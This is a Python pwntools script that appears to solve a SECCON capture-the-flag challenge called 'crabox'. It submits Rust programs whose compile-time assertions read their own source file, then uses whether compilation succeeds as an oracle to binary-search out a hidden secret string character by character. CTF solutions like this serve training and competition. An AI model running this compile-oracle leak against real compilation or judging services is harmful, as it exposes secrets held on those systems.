from pwn import *
from string import printable

TEMPLATE = """
const F: &[u8] = include_bytes!(file!());
const _T: () = assert!(F[F.len() - POSITION] <= GUESSNUM);
"""


def guess_char(position, guess_ord):
    with context.local(log_level="error"):
        conn = remote("crabox.seccon.games", 1337)

    conn.recvuntil(b"Input your program (the last line must start with __EOF__):")
    conn.recvline()

    payload = (
        TEMPLATE.replace("POSITION", str(position))
        .replace("GUESSNUM", str(guess_ord))
        .encode()
    )

    conn.sendline(payload)
    conn.sendline(b"__EOF__")

    conn.recvuntil(b":")
    r = conn.recvline().strip().decode()

    with context.local(log_level="error"):
        conn.close()

    return r == ")"


known = ""

while "Steal me" not in known:
    with log.progress(f"Building on {known!r}") as p:
        start, end = 0, 0x7F
        while start != end:
            assert start <= end
            mid = (start + end) // 2
            p.status(f"Range: {chr(start)!r} - {chr(end)!r} | Guessing {chr(mid)!r}")
            if guess_char(len(known) + 1, mid):
                start, end = start, mid
            else:
                start, end = mid + 1, end

        known = chr(start) + known
        p.success(f"Found {known!r}")
